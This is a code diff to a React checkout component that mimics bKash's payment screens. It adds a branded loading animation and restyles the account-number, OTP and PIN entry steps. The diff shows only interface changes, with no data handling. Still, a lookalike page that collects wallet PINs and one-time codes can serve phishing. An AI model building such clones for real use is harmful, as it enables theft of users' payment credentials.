@@ -48,6 +48,18 @@ export default function OnlineCheckoutGateway({
   const [isRedirecting, setIsRedirecting] = useState(false);
   const [redirectProgress, setRedirectProgress] = useState(0);
 
+  // Initial 2 seconds bKash loading state
+  const [isBkashLoading, setIsBkashLoading] = useState(type === 'bkash');
+
+  useEffect(() => {
+    if (type === 'bkash') {
+      const timer = setTimeout(() => {
+        setIsBkashLoading(false);
+      }, 2000);
+      return () => clearTimeout(timer);
+    }
+  }, [type]);
+
   // Progressive loading simulation indicator over 2 seconds
   useEffect(() => {
     const interval = setInterval(() => {
@@ -845,6 +857,16 @@ export default function OnlineCheckoutGateway({
                 transform: scale(1) translateY(0);
               }
             }
+            @keyframes bkash-loading-pulse {
+              0%, 100% {
+                opacity: 0.35;
+                transform: scale(0.95);
+              }
+              50% {
+                opacity: 1;
+                transform: scale(1.05);
+              }
+            }
             .bkash-dot-1 {
               animation: bkash-bounce 0.8s infinite ease-in-out;
               animation-delay: 0s;
@@ -857,6 +879,22 @@ export default function OnlineCheckoutGateway({
               animation: bkash-bounce 0.8s infinite ease-in-out;
               animation-delay: 0.3s;
             }
+            .bkash-load-dot-1 {
+              animation: bkash-loading-pulse 1s infinite ease-in-out;
+              animation-delay: 0s;
+            }
+            .bkash-load-dot-2 {
+              animation: bkash-loading-pulse 1s infinite ease-in-out;
+              animation-delay: 0.15s;
+            }
+            .bkash-load-dot-3 {
+              animation: bkash-loading-pulse 1s infinite ease-in-out;
+              animation-delay: 0.3s;
+            }
+            .bkash-load-dot-4 {
+              animation: bkash-loading-pulse 1s infinite ease-in-out;
+              animation-delay: 0.45s;
+            }
             .bkash-animate-fade {
               animation: bkash-fade-in 0.22s ease-out forwards;
             }
@@ -868,12 +906,25 @@ export default function OnlineCheckoutGateway({
           <form onSubmit={handleNextStep} className="flex flex-col">
             
             <div 
-              className="min-h-[245px] flex flex-col justify-center items-center p-5 sm:p-6 transition-all duration-300 relative text-center"
+              className="min-h-[285px] flex flex-col justify-center items-center p-5 sm:p-6 transition-all duration-300 relative text-center"
               style={{ 
                 background: '#e2136e'
               }}
             >
-              {showCancelConfirm ? (
+              {isBkashLoading ? (
+                <div className="w-full flex flex-col justify-center items-center text-center py-10 bkash-animate-fade">
+                  {/* bKash 4 dots loader */}
+                  <div className="flex items-center justify-center gap-2 mb-4">
+                    <span className="w-[11px] h-[11px] bg-white rounded-full bkash-load-dot-1" />
+                    <span className="w-[11px] h-[11px] bg-white rounded-full bkash-load-dot-2" />
+                    <span className="w-[11px] h-[11px] bg-white rounded-full bkash-load-dot-3" />
+                    <span className="w-[11px] h-[11px] bg-white rounded-full bkash-load-dot-4" />
+                  </div>
+                  <p className="text-white text-[15.5px] font-sans font-medium tracking-wide">
+                    Loading
+                  </p>
+                </div>
+              ) : showCancelConfirm ? (
                 <div className="w-full flex flex-col justify-center items-center text-center px-2 bkash-animate-fade">
                   {/* Outlined Hand Icon */}
                   <Hand className="w-8 h-8 text-white mb-2.5" strokeWidth={1.5} />
@@ -886,7 +937,7 @@ export default function OnlineCheckoutGateway({
                   {/* STEP 1: ACCOUNT NUMBER ENTRY */}
                   {step === 1 && (
                     <div key="step-1" className="w-full flex flex-col justify-center items-center text-center px-4 bkash-animate-fade">
-                      <h2 className="text-white/95 text-[15.5px] max-[600px]:text-[14px] font-normal mb-3.5 tracking-wide">
+                      <h2 className="text-white/95 text-[15.5px] max-[600px]:text-[14px] font-normal mt-0 mb-1 tracking-wide">
                         Your bKash Account Number
                       </h2>
                       
@@ -906,7 +957,7 @@ export default function OnlineCheckoutGateway({
                         className="w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-[16px] text-zinc-800 font-sans focus:outline-none focus:border-[#e2136e] shadow-sm bg-white placeholder-zinc-400 disabled:opacity-80 transition-all"
                       />
 
-                      <div className="terms mt-4 text-white/90 text-[12px] text-center">
+                      <div className="terms mt-1 text-white/90 text-[12px] text-center">
                         Confirm and proceed,{' '}
                         <a href="#" onClick={(e) => e.preventDefault()} className="underline text-white font-normal hover:text-zinc-200 transition-colors">
                           terms & conditions
@@ -935,7 +986,11 @@ export default function OnlineCheckoutGateway({
                         disabled={isBtnSubmitting}
                         onChange={(e) => handleOtpChange(e.target.value)}
                         placeholder="Enter 6 digit code"
-                        className="w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-[16px] text-zinc-800 font-sans focus:outline-none focus:border-[#e2136e] shadow-sm bg-white tracking-[0.2em] placeholder-zinc-400 disabled:opacity-80 transition-all"
+                        className={`w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-zinc-800 font-sans focus:outline-none focus:border-[#e2136e] shadow-sm bg-white disabled:opacity-80 transition-all placeholder-[#a5a5a5] placeholder:font-normal placeholder:tracking-normal ${
+                          otp 
+                            ? 'text-[18px] font-semibold tracking-[0.25em]' 
+                            : 'text-[15.5px] font-normal tracking-normal'
+                        }`}
                       />
 
                       <div className="terms mt-4 text-white/90 text-[12px] text-center">
@@ -957,8 +1012,8 @@ export default function OnlineCheckoutGateway({
 
                   {/* STEP 3: PIN ENTER */}
                   {step === 3 && (
-                    <div key="step-3" className="w-full flex flex-col justify-center items-center text-center px-4 bkash-animate-fade overflow-hidden">
-                      <h2 className="text-white/95 text-[12.5px] min-[400px]:text-[13px] max-[400px]:text-[11px] font-normal mb-3.5 tracking-wide whitespace-nowrap overflow-hidden text-ellipsis w-full">
+                    <div key="step-3" className="w-full flex flex-col justify-center items-center text-center px-4 bkash-animate-fade">
+                      <h2 className="text-white/95 text-[14.5px] max-[600px]:text-[12.5px] font-normal mb-3.5 tracking-wide text-center leading-relaxed">
                         Enter PIN Of Your bKash Account Number ({obfuscateNumber(accountNumber)})
                       </h2>
                       
@@ -979,8 +1034,12 @@ export default function OnlineCheckoutGateway({
                         value={pin}
                         disabled={isBtnSubmitting}
                         onChange={(e) => handlePinChange(e.target.value)}
-                        placeholder="●●●●●"
-                        className="w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-[22px] text-zinc-800 font-semibold focus:outline-none focus:border-[#e2136e] shadow-sm bg-white tracking-[10px] pl-[10px] placeholder-zinc-300 disabled:opacity-80 transition-all"
+                        placeholder="Enter PIN"
+                        className={`w-full max-w-[340px] h-[42px] px-3 border border-[#d5d5d5] rounded-[3px] text-center text-zinc-800 focus:outline-none focus:border-[#e2136e] shadow-sm bg-white disabled:opacity-80 transition-all placeholder-[#a5a5a5] placeholder:font-normal placeholder:tracking-normal ${
+                          pin 
+                            ? 'text-[22px] font-semibold tracking-[10px] pl-[10px]' 
+                            : 'text-[15.5px] font-normal tracking-normal'
+                        }`}
                         style={{ WebkitTextSecurity: 'disc' }}
                       />
                     </div>
@@ -992,64 +1051,75 @@ export default function OnlineCheckoutGateway({
             {/* ======================================= */}
             {/* BUTTONS PANEL */}
             {/* ======================================= */}
-            <div className="border-t border-[#e5e5e5] p-4 flex gap-4 bg-[#f2f2f2]">
-              {showCancelConfirm ? (
-                <>
-                  <button
-                    type="button"
-                    onClick={handleCancelAction}
-                    disabled={isBtnSubmitting}
-                    className="btn cancel flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium bg-white border border-zinc-200 text-zinc-700 transition-all cursor-pointer hover:bg-zinc-50 active:scale-[0.99] focus:outline-none focus:ring-0 disabled:opacity-50 disabled:cursor-not-allowed"
-                  >
-                    Yes
-                  </button>
-                  
-                  <button
-                    type="button"
-                    onClick={() => setShowCancelConfirm(false)}
-                    disabled={isBtnSubmitting}
-                    className="btn confirm flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none disabled:opacity-50 disabled:cursor-not-allowed"
-                    style={{
-                      backgroundColor: '#e2136e',
-                      color: '#ffffff',
-                      cursor: 'pointer'
-                    }}
-                  >
-                    No
-                  </button>
-                </>
-              ) : (
-                <>
-                  <button
-                    type="button"
-                    onClick={() => setShowCancelConfirm(true)}
-                    disabled={isBtnSubmitting}
-                    className="btn cancel flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium bg-white text-[#757575] hover:bg-zinc-50 border border-[#d5d5d5] transition-all cursor-pointer active:scale-[0.99] focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed outline-none"
-                  >
-                    Cancel
-                  </button>
-                  
-                  <button
-                    type="submit"
-                    disabled={isConfirmDisabled() || isBtnSubmitting}
-                    className="btn confirm flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none flex items-center justify-center"
-                    style={{
-                      backgroundColor: isConfirmDisabled() && !isBtnSubmitting ? '#e6e6e6' : '#e2136e',
-                      color: isConfirmDisabled() && !isBtnSubmitting ? '#a0a0a0' : '#ffffff',
-                      cursor: isConfirmDisabled() || isBtnSubmitting ? 'not-allowed' : 'pointer'
-                    }}
-                  >
-                    {isBtnSubmitting ? (
-                      <div className="flex items-center justify-center gap-1.5 py-1">
-                        <span className="w-1.5 h-1.5 bg-white rounded-full bkash-dot-1" />
-                        <span className="w-1.5 h-1.5 bg-white rounded-full bkash-dot-2" />
-                        <span className="w-1.5 h-1.5 bg-white rounded-full bkash-dot-3" />
-                      </div>
-                    ) : (
-                      "Confirm"
-                    )}
-                  </button>
-                </>
+            <div 
+              className={`p-4 flex gap-4 transition-all duration-300 ${
+                isBkashLoading 
+                  ? 'h-[74px] border-none' 
+                  : 'border-t border-[#e5e5e5]'
+              }`}
+              style={{
+                backgroundColor: isBkashLoading ? '#e2136e' : '#f2f2f2'
+              }}
+            >
+              {!isBkashLoading && (
+                showCancelConfirm ? (
+                  <>
+                    <button
+                      type="button"
+                      onClick={handleCancelAction}
+                      disabled={isBtnSubmitting}
+                      className="btn cancel flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium bg-white border border-zinc-200 text-zinc-700 transition-all cursor-pointer hover:bg-zinc-50 active:scale-[0.99] focus:outline-none focus:ring-0 disabled:opacity-50 disabled:cursor-not-allowed"
+                    >
+                      Yes
+                    </button>
+                    
+                    <button
+                      type="button"
+                      onClick={() => setShowCancelConfirm(false)}
+                      disabled={isBtnSubmitting}
+                      className="btn confirm flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none disabled:opacity-50 disabled:cursor-not-allowed"
+                      style={{
+                        backgroundColor: '#e2136e',
+                        color: '#ffffff',
+                        cursor: 'pointer'
+                      }}
+                    >
+                      No
+                    </button>
+                  </>
+                ) : (
+                  <>
+                    <button
+                      type="button"
+                      onClick={() => setShowCancelConfirm(true)}
+                      disabled={isBtnSubmitting}
+                      className="btn cancel flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium bg-white text-[#757575] hover:bg-zinc-50 border border-[#d5d5d5] transition-all cursor-pointer active:scale-[0.99] focus:outline-none disabled:opacity-50 disabled:cursor-not-allowed outline-none"
+                    >
+                      Cancel
+                    </button>
+                    
+                    <button
+                      type="submit"
+                      disabled={isConfirmDisabled() || isBtnSubmitting}
+                      className="btn confirm flex-1 h-[42px] rounded-[3px] text-[13.5px] font-sans font-medium transition-all active:scale-[0.99] focus:outline-none border-none outline-none flex items-center justify-center"
+                      style={{
+                        backgroundColor: isConfirmDisabled() && !isBtnSubmitting ? '#e6e6e6' : '#e2136e',
+                        color: isConfirmDisabled() && !isBtnSubmitting ? '#a0a0a0' : '#ffffff',
+                        cursor: isConfirmDisabled() || isBtnSubmitting ? 'not-allowed' : 'pointer'
+                      }}
+                    >
+                      {isBtnSubmitting ? (
+                        <div className="flex items-center justify-center gap-1.5 py-1">
+                          <span className="w-1.5 h-1.5 bg-white rounded-full bkash-dot-1" />
+                          <span className="w-1.5 h-1.5 bg-white rounded-full bkash-dot-2" />
+                          <span className="w-1.5 h-1.5 bg-white rounded-full bkash-dot-3" />
+                        </div>
+                      ) : (
+                        "Confirm"
+                      )}
+                    </button>
+                  </>
+                )
               )}
             </div>
 
